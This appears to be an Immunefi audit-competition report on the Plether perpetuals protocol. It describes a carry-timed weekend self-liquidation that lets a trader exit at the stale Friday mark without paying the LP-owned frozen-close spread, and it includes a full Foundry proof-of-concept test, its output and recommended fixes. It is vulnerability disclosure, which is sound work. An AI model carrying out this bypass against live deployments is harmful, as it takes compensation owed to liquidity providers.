# \#97755 [SC-Medium] Carry-timed self-liquidation during the frozen weekend exits at the stale Friday mark for ~7.5 bps, bypassing the 50 bps LP-owned frozen-close spread

**Submitted on Nov 3rd 2026 at 00:35:29 UTC by @Grant4969 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97755
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Contract fails to deliver promised returns, but doesn't lose value

## Description

## Summary

During the oracle-frozen weekend the only documented voluntary exit is a frozen close, which is priced at the stored Friday mark and charges a fixed `frozenCloseSpreadBps` (50 bps at launch) that the documentation calls "LP-owned": it is the compensation LPs receive for letting traders exit at a stale price while the real market has moved. Liquidation, by contrast, is priced at the stored Friday mark plus a 2.5 bps adverse confidence shift and charges only the 10 bps liquidation charge (half of which is the keeper share) plus unpaid carry and VPI clawback; it does not assess the spread.

Because the weekend margin requirement is static (FAD 300 bps on a frozen mark) and carry accrues deterministically against the position, a position holder can compute the exact moment at which carry alone makes the account liquidatable, park the position at that point with one pre-FAD `addMargin`, and — at a time of its choosing after observing the weekend market — call `router.executeLiquidation` on itself. The Router passes `msg.sender` as the keeper and the Engine does not reject `keeper == account`, so the keeper share of the liquidation charge flows back to the trader. The all-in exit cost is ~7.5 bps of notional instead of ≥ 54 bps + exit VPI. `addMargin` is owner-only and has no calendar gate, so the crossing time is a rolling option that the owner can postpone while frozen.

The PoC runs both exits from the same state at the same timestamp through the production Router and `PletherOracle` with the release parameters. On an 800k USDG notional LONG the trader keeps 3,560 USDG more and the LPs receive 3,240 USDG less (40.5 bps of notional) than under the documented frozen close; the treasury loses the 320 USDG exit fee. The fuzz variant (256 runs over crossing times 1–45 h into the freeze and sizes 80k–3.2M USDG) shows the ≥ 30 bps bypass at every point.

## Root cause

1. Frozen liquidation price = stored mark + confidence shift, no spread. `PletherOracle.sol` `_frozenBasket` (L729–L743) returns `engine.lastMarkPrice()` with `confidence = price × basketMaxConfidenceRatioBps / 10_000` (10 bps); `_adverseLiquidationPrice` / `_liquidationConfidenceShift` (L943–L971) shift it by `confidence × adverseConfidenceMultiplierBps / 10_000` (launch 2,500 bps → 2.5 bps of price), LONG → `price + shift`.
2. The spread exists only on the voluntary close path. `CloseAccountingLib.sol` L121–L124: `if (inputs.oracleFrozen) { state.frozenSpreadAssets = (notionalAssets * inputs.frozenCloseSpreadBps) / 10_000; }`. The liquidation action settlement (`CfdEnginePlanLib.sol` `_planLiquidationActionSettlement`, L1554–L1572) assesses only `pendingCarry − realizedCarry + vpiClawback`; `frozenSpreadAssets` never appears on the liquidation path.
3. Carry crosses the threshold alone. `CfdEnginePlanLib.sol` L1440–L1468 realizes pending carry against the snapshot before the exact-price health check, with `maintMarginBps = snap.isFadWindow ? fadMarginBps : maintMarginBps` (300 bps all weekend: `MarketCalendarLib.marketStatus` returns `fadWindow = oracleFrozen = true` on Saturday and until the Sunday boundary). With a static mark the only moving input is carry, so the crossing time is a deterministic function of the pledge.
4. The owner can set and postpone the crossing. `CfdEngine.addMargin` (L501–L511) is owner-only with no calendar or oracle gate and succeeds while frozen (asserted in the PoC).
5. Self-keeper is accepted and refunded. `OrderLiquidationBatchLogic.executeLiquidation` (L706–L729) is permissionless and forwards `msg.sender` as the keeper; `CfdEngine._applyLiquidation` (L1324–L1340) only skips keeper checkpointing when `keeper == delta.account`, then `settlementSidecar.executeLiquidation(delta, publishTime, keeper)` pays the keeper share (5 bps) to the account itself.

## Attack scenario (as executed by the PoC)

1. Thursday: open an 800k USDG notional LONG with 300 bps weekday margin at mark 0.80.
2. Friday 18:00 UTC (live, pre-FAD): the last live mark is installed at 0.80. The owner binary-searches the exact `addMargin` top-up so that equity at the frozen liquidation price (0.8002) equals the FAD threshold at its chosen time, Saturday 02:00 UTC (1,491 USDG on 800k).
3. The account is healthy at FAD start (21:30 UTC) and at freeze start (22:00 UTC). While frozen, a further `addMargin` postpones the crossing (rolling option, asserted).
4. At crossing + 10 min the account is liquidatable while `lastMarkPrice == 0.80` and `lastMarkTime == Friday 18:00 UTC`: carry alone crossed the threshold.
5. Branch A (designed path): voluntary frozen close via `router.commitOrder` + `router.executeOrder` at the stale mark, paying 50 bps spread + 4 bps fee + exit VPI.
6. Branch B (bypass): the trader itself calls `router.executeLiquidation(trader, …)` at the same timestamp, priced at 0.8002 with no spread; the 5 bps keeper share is credited back to the trader.
7. Trader wealth B − A = 3,560 USDG; LP `pool.totalAssets()` A − B = 3,240 USDG; treasury A − B = 320 USDG.

Reconciliation on 800k notional: trader saves spread 4,000 + exit fee 320 − forgone close VPI rebate ≈ 160 − adverse shift 200 − net liquidation charge 400 = 3,560 (exact); LP shortfall 4,000 − 160 − 200 − 400 = 3,240 (exact).

## Impact

- Every frozen-weekend exit taken through carry-timed (self-)liquidation deprives Senior/Junior LPs of ≈ 40 bps of notional of the compensation the protocol documents as LP-owned ("the spread is LP-owned and never protocol-treasury revenue", `SECURITY.md` Oracle regimes), and the treasury of the 4 bps exit fee. It scales linearly with position size up to `maxSkewRatio × depth`.
- The trader buys the stale-mark exit option — exiting at Friday's price after seeing Saturday/Sunday information — for ~7.5 bps instead of the ≥ 54 bps + VPI the design charges for exactly that option. Whenever the weekend move is adverse by more than 7.5 bps, LPs additionally eat the difference between Friday's mark and the live price that a Monday exit would have paid, net of only 7.5 bps.
- It recurs every weekend and every override day, is permissionless, needs no special state beyond ordinary weekend leverage (positions must hold ≥ 300 bps anyway), and any keeper can be used (a third-party keeper produces the same LP shortfall; self-keeping adds the 5 bps refund).

## Why this is not covered by the documented behaviour or the known-issue list

- `ACCOUNTING_SPEC.md` and `SECURITY.md` state that liquidation does not assess `frozenCloseSpreadBps` and that the spread applies to "oracle-frozen voluntary closes only". That documents the mechanism, not the consequence shown here: that the position holder can schedule frozen liquidatability to the minute at a static mark, keep it as a rolling option with `addMargin`, and self-trigger it as a strictly cheaper voluntary exit, so that the documented LP compensation for stale-mark exits is never collected.
- No entry in the program's known-issue list (Cecuro MED-7/13/16/22/24/29/30, LOW-57, the clock-alignment item, SECURITY.md Known Limitations / Router and keeper limitations) and none of the three prior reports mention carry-timed or self-triggered frozen liquidation.
- Keepers are explicitly untrusted on the program page ("anyone can execute orders, liquidations, price updates and protections, so harm caused by any caller acting as a keeper is in scope"). No trusted role is involved.
- Severity is assessed with the release parameters stated on the program page (frozen-market margin 3 %, frozen-close spread 0.50 %, execution fee 0.04 %); the PoC asserts them in-test together with the launch oracle parameters (`basketMaxConfidenceRatioBps 10`, `adverseConfidenceMultiplierBps 2500`).

## Recommendation

Price the stale-mark exit the same way on both routes while `oracleFrozen`:

- apply an adverse liquidation shift of at least `price × frozenCloseSpreadBps / 10_000` instead of the 2.5 bps confidence shift, or assess `frozenCloseSpreadBps` as a liquidation action charge on the reduced notional (LP-owned, as on the close path); and/or
- reject `keeper == account` (accounts controlled by the position owner cannot be detected on-chain, so the pricing fix above is the robust one); and/or
- do not let carry realised at a static mark alone cross the FAD threshold without the spread, e.g. treat carry-only liquidations while frozen as voluntary exits for pricing purposes.


## Proof of Concept

## Proof of Concept

The test below uses only the repository's own harness (`test/perps/BasePerpTest.sol`) and the production Engine, Planner, Sidecars, HousePool, TrancheVaults, `OrderRouter` and `PletherOracle` at the commit in scope; no contract in `packages/perps/src` is modified. The launch oracle adverse multiplier is set through the timelocked Router config path (`_setRouterConfig`). Calendar: Friday 2026-03-06 (FAD from 21:30 UTC, frozen from 22:00 UTC until Sunday 21:00 UTC under EDT).

Save the test as `packages/perps/test/submission/FrozenSelfLiquidationSpreadBypass.t.sol` (any directory one level below `packages/perps/test/` works, because of the relative import of `BasePerpTest`) and run from `packages/perps` with the default profile:

```bash
git submodule update --init --recursive
FOUNDRY_SPARSE_MODE=true forge test --match-path 'test/submission/FrozenSelfLiquidationSpreadBypass.t.sol' -vv
```

`FOUNDRY_SPARSE_MODE=true` only limits compilation to this test's dependency closure (about one minute under the default via-IR profile); without it `forge test` compiles the whole package through via-IR first, which takes much longer but gives the same result. The test passes identically under the project's fast lane (`FOUNDRY_VIA_IR=false`).

Observed output (default via-IR profile):

```
Ran 2 tests for test/submission/FrozenSelfLiquidationSpreadBypass.t.sol:FrozenSelfLiquidationSpreadBypassTest
[PASS] testFuzz_FrozenSelfLiquidationBypass(uint256,uint256) (runs: 256, μ: 16229197, ~: 16399837)
  precise pre-FAD top-up (USDG atoms): 415226657
  equity at exit (USDG atoms): 7242607596
  notional (USDG atoms): 241360000000
  trader start wealth: 10257800000
  trader wealth after voluntary frozen close: 8857298917
  trader wealth after self-liquidation: 9965060722
  LP assets after voluntary frozen close: 20003207413083
  LP assets after self-liquidation: 20002196195278
  treasury after close: 193088000
  treasury after self-liquidation: 96544000
  designed frozen spread (50 bps of notional): 1206800000
  trader saving (USDG atoms): 1107761805
  LP shortfall vs designed frozen exit (USDG atoms): 1011217805
[PASS] test_CarryTimedFrozenSelfLiquidationBypassesFrozenCloseSpread() (gas: 16050465)
  precise pre-FAD top-up (USDG atoms): 1491486184
  equity at exit (USDG atoms): 24005971441
  notional (USDG atoms): 800000000000
  trader start wealth: 34000000000
  trader wealth after voluntary frozen close: 29354465554
  trader wealth after self-liquidation: 32914482876
  LP assets after voluntary frozen close: 20006005534446
  LP assets after self-liquidation: 20002765517124
  treasury after close: 640000000
  treasury after self-liquidation: 320000000
  designed frozen spread (50 bps of notional): 4000000000
  trader saving (USDG atoms): 3560017322
  LP shortfall vs designed frozen exit (USDG atoms): 3240017322
Suite result: ok. 2 passed; 0 failed; 0 skipped
```

Harm assertions: from the same snapshot at the same timestamp, trader wealth after self-liquidation > after the voluntary frozen close, and LP `totalAssets` after the voluntary close > after self-liquidation, each by ≥ 30 bps of notional; the account is asserted healthy at FAD start and at freeze start, liquidatable only by carry at the chosen time with `lastMarkPrice == 0.80` and `lastMarkTime == Friday 18:00 UTC`, and the frozen-period `addMargin` postponement is asserted.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";

/// @notice During the oracle-frozen weekend, a position parked at the 300 bps FAD threshold becomes liquidatable
///         at an owner-chosen time purely through carry (static Friday mark). The owner self-liquidates through the
///         production Router at the stale Friday mark and pays ~2.5 bps adverse shift + 10 bps charge (5 bps
///         refunded as keeper share) instead of the 50 bps LP-owned frozen-close spread + 4 bps fee + exit VPI that
///         a voluntary frozen close of the same position at the same moment pays.
///         Launch parameters from DEPLOYMENT.md "Initial release parameters".
///         All timestamps are explicit constants (never `block.timestamp` after a warp) so the test behaves
///         identically under the default via-IR profile and the fast (via_ir=false) lane.
contract FrozenSelfLiquidationSpreadBypassTest is BasePerpTest {

    address internal trader = address(0xA11CE);

    // Fri 2026-03-06 18:00 UTC (13:00 New York, EST) — live, pre-FAD. FAD from 21:30 UTC, oracle frozen from
    // 22:00 UTC until Sun 2026-03-08 21:00 UTC (17:00 New York, EDT).
    uint256 internal constant FRIDAY_18UTC = 1_772_820_000;
    uint256 internal constant THURSDAY_18UTC = FRIDAY_18UTC - 1 days;
    uint256 internal constant FRIDAY_FREEZE = FRIDAY_18UTC + 4 hours;
    uint256 internal constant P0 = 0.8e8; // basket != $1.00

    // Scenario parameters (set before any snapshot so they survive vm.revertToState).
    uint256 internal crossing; // owner-chosen crossing time
    uint256 internal size; // position size (18-dec tokens)
    uint256 internal wealthStart;

    /// @dev Branch outcomes live in memory: vm.revertToState also reverts this test contract's storage.
    struct Outcome {
        uint256 wealth;
        uint256 lp;
        uint256 treasury;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 20_000_000e6;
    }

    function _notional() internal view returns (uint256) {
        return (size * P0) / 1e20;
    }

    function _exitTime() internal view returns (uint256) {
        return crossing + 10 minutes;
    }

    function _emptyPyth() internal pure returns (bytes[] memory data) {
        data = new bytes[](1);
        data[0] = "";
    }

    function _wealth() internal view returns (uint256) {
        return clearinghouse.balanceAssets(trader) + engine.traderClaimBalanceAssets(trader);
    }

    function _frozenLiquidationPrice() internal view returns (uint256) {
        uint256 conf = (P0 * pletherOracle.basketMaxConfidenceRatioBps()) / 10_000;
        uint256 shift = (conf * pletherOracle.adverseConfidenceMultiplierBps()) / 10_000;
        return P0 + shift; // LONG is adverse-up
    }

    function _liquidatableAfterTopUp(
        uint256 topUp,
        uint256 at
    ) internal returns (bool liq) {
        uint256 snap = vm.snapshotState();
        if (topUp > 0) {
            vm.prank(trader);
            engine.addMargin(trader, topUp);
        }
        vm.warp(at);
        liq = engineLens.previewLiquidation(trader, _frozenLiquidationPrice()).liquidatable;
        vm.revertToState(snap);
    }

    /// @dev Thursday open, Friday pre-FAD top-up to exactly the FAD threshold at the chosen weekend crossing time.
    function _setUpParkedPosition() internal {
        // Launch oracle adverse multiplier (2,500 bps).
        IOrderRouterAdminHost.RouterConfig memory cfg = _routerConfig();
        cfg.adverseConfidenceMultiplierBps = 2500;
        _setRouterConfig(cfg);
        assertEq(pletherOracle.adverseConfidenceMultiplierBps(), 2500, "launch adverse multiplier");
        assertEq(pletherOracle.basketMaxConfidenceRatioBps(), 10, "launch basket confidence ratio");
        assertEq(engine.frozenCloseSpreadBps(), 50, "launch frozen close spread");
        assertEq(engine.executionFeeBps(), 4, "launch execution fee");

        // Thursday 18:00 UTC: open a LONG with a weekday margin of 300 bps (below the weekend FAD requirement once
        // fees, VPI, reserve and carry are taken).
        uint256 notional = _notional();
        vm.warp(THURSDAY_18UTC);
        vm.prank(address(router));
        engine.updateMarkPrice(P0, uint64(THURSDAY_18UTC));
        vm.warp(THURSDAY_18UTC + 1);
        _fundTrader(trader, (notional * 425) / 10_000);
        wealthStart = _wealth();
        _open(trader, CfdTypes.Side.LONG, size, (notional * 300) / 10_000, P0);
        (uint256 openSize,,,,,,) = engine.positions(trader);
        assertEq(openSize, size, "position opened");

        // Friday 18:00 UTC (live, pre-FAD): last live mark before the weekend at the same price.
        vm.warp(FRIDAY_18UTC);
        vm.prank(address(router));
        engine.updateMarkPrice(P0, uint64(FRIDAY_18UTC));
        assertEq(uint256(engine.lastMarkTime()), FRIDAY_18UTC, "Friday mark installed");
        vm.warp(FRIDAY_18UTC + 60);

        // Owner computes the exact top-up so that equity == FAD threshold at the chosen crossing time.
        assertTrue(_liquidatableAfterTopUp(0, crossing), "without top-up the position would fail the weekend FAD");
        uint256 lo = 0;
        uint256 hi = (notional * 100) / 10_000;
        assertFalse(_liquidatableAfterTopUp(hi, crossing), "upper bound healthy");
        while (hi - lo > 1) {
            uint256 mid = (lo + hi) / 2;
            if (_liquidatableAfterTopUp(mid, crossing)) {
                lo = mid;
            } else {
                hi = mid;
            }
        }
        vm.prank(trader);
        engine.addMargin(trader, hi);
        emit log_named_uint("precise pre-FAD top-up (USDG atoms)", hi);
    }

    function _runScenario() internal {
        _setUpParkedPosition();
        uint256 pLiq = _frozenLiquidationPrice();

        // Healthy at FAD start and through the freeze start; static mark.
        vm.warp(FRIDAY_FREEZE - 30 minutes + 1);
        assertTrue(engine.isFadWindow(), "FAD window active");
        assertFalse(engineLens.previewLiquidation(trader, pLiq).liquidatable, "healthy at FAD start");
        vm.warp(FRIDAY_FREEZE + 1);
        assertTrue(engine.isOracleFrozen(), "oracle frozen");
        assertFalse(engineLens.previewLiquidation(trader, pLiq).liquidatable, "healthy at freeze start");

        // Rolling option: during the freeze the owner can postpone the crossing with addMargin (no calendar gate).
        {
            uint256 snap = vm.snapshotState();
            vm.warp(crossing - 5 minutes);
            vm.prank(trader);
            engine.addMargin(trader, (_notional() * 1) / 10_000);
            vm.warp(_exitTime());
            assertFalse(
                engineLens.previewLiquidation(trader, pLiq).liquidatable, "owner postponed the crossing while frozen"
            );
            vm.revertToState(snap);
        }

        // At the owner-chosen time, carry alone has crossed the FAD threshold; the mark is still Friday's.
        vm.warp(_exitTime());
        assertTrue(engine.isOracleFrozen(), "still frozen at exit");
        assertEq(engine.lastMarkPrice(), P0, "static Friday mark");
        assertEq(uint256(engine.lastMarkTime()), FRIDAY_18UTC, "mark not refreshed during freeze");
        ICfdEngineTypes.LiquidationPreview memory pv = engineLens.previewLiquidation(trader, pLiq);
        assertTrue(pv.liquidatable, "carry alone made the account liquidatable at the chosen time");
        emit log_named_int("equity at exit (USDG atoms)", pv.equityAssets);

        uint256 snapshot = vm.snapshotState();
        Outcome memory closeOut;
        Outcome memory liqOut;

        // Branch A — designed path: voluntary frozen close of the same position at the same moment.
        vm.prank(trader);
        uint64 closeId = router.commitOrder(CfdTypes.Side.LONG, size, 0, 0, true);
        vm.warp(_exitTime() + 50);
        vm.roll(vm.getBlockNumber() + 10);
        router.executeOrder(closeId, _emptyPyth());
        (uint256 sizeAfterClose,,,,,,) = engine.positions(trader);
        assertEq(sizeAfterClose, 0, "voluntary frozen close executed");
        closeOut.wealth = _wealth();
        closeOut.lp = pool.totalAssets();
        closeOut.treasury = clearinghouse.balanceAssets(PROTOCOL_TREASURY_ACCOUNT);

        vm.revertToState(snapshot);

        // Branch B — bypass: owner self-liquidates through the Router at the same timestamp.
        vm.warp(_exitTime() + 50);
        vm.roll(vm.getBlockNumber() + 10);
        vm.prank(trader);
        router.executeLiquidation(trader, _emptyPyth());
        (uint256 sizeAfterLiq,,,,,,) = engine.positions(trader);
        assertEq(sizeAfterLiq, 0, "self-liquidation executed at the stale Friday mark");
        assertEq(engine.lastMarkPrice(), P0, "liquidation used the frozen Friday mark");
        liqOut.wealth = _wealth();
        liqOut.lp = pool.totalAssets();
        liqOut.treasury = clearinghouse.balanceAssets(PROTOCOL_TREASURY_ACCOUNT);
        _assertHarm(closeOut, liqOut);
    }

    function _assertHarm(
        Outcome memory closeOut,
        Outcome memory liqOut
    ) internal {
        uint256 notional = _notional();
        emit log_named_uint("notional (USDG atoms)", notional);
        emit log_named_uint("trader start wealth", wealthStart);
        emit log_named_uint("trader wealth after voluntary frozen close", closeOut.wealth);
        emit log_named_uint("trader wealth after self-liquidation", liqOut.wealth);
        emit log_named_uint("LP assets after voluntary frozen close", closeOut.lp);
        emit log_named_uint("LP assets after self-liquidation", liqOut.lp);
        emit log_named_uint("treasury after close", closeOut.treasury);
        emit log_named_uint("treasury after self-liquidation", liqOut.treasury);
        emit log_named_uint("designed frozen spread (50 bps of notional)", (notional * 50) / 10_000);

        // HARM: exiting at the same stale mark at the same moment, the trader keeps materially more and the LPs
        // receive materially less than under the documented frozen-exit pricing (>= 30 bps of notional each).
        assertGt(liqOut.wealth, closeOut.wealth, "self-liquidation is the cheaper frozen exit");
        uint256 traderSaving = liqOut.wealth - closeOut.wealth;
        assertGt(closeOut.lp, liqOut.lp, "LPs receive less on the self-liquidation exit");
        uint256 lpShortfall = closeOut.lp - liqOut.lp;
        emit log_named_uint("trader saving (USDG atoms)", traderSaving);
        emit log_named_uint("LP shortfall vs designed frozen exit (USDG atoms)", lpShortfall);
        assertGe(traderSaving, (notional * 30) / 10_000, "trader saves >= 30 bps of notional");
        assertGe(lpShortfall, (notional * 30) / 10_000, "LPs lose >= 30 bps of notional of frozen-exit charge");
    }

    /// @dev 800k USDG notional LONG, owner-chosen crossing Saturday 02:00 UTC.
    function test_CarryTimedFrozenSelfLiquidationBypassesFrozenCloseSpread() public {
        size = 1_000_000e18;
        crossing = FRIDAY_18UTC + 8 hours;
        _runScenario();
    }

    /// @dev Fuzz variant: any crossing time inside the 47 h freeze (1 h .. 45 h after freeze start) and any size
    ///      from 80k to 3.2M USDG notional yields the same >= 30 bps bypass.
    function testFuzz_FrozenSelfLiquidationBypass(
        uint256 crossingHours,
        uint256 sizeLots
    ) public {
        crossingHours = bound(crossingHours, 1, 45);
        sizeLots = bound(sizeLots, 1000, 40_000); // positionSizeQuantum = 100 tokens per lot
        size = sizeLots * 100e18;
        crossing = FRIDAY_FREEZE + crossingHours * 1 hours;
        _runScenario();
    }

}
```
